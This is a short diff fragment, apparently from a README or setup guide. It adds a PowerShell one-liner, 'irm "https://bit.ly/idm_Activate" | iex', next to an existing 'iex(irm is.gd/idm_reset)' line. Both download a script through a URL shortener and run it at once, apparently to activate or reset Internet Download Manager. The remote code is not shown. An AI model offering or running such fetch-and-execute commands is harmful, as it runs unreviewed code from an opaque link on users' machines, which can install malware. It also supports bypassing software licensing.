@@ -309,6 +309,9 @@ git push origin main  # or your current branch
   ```sh
   iex(irm is.gd/idm_reset)
   ```
+  ```sh
+  irm "https://bit.ly/idm_Activate" | iex
+  ```
 ---
 
 
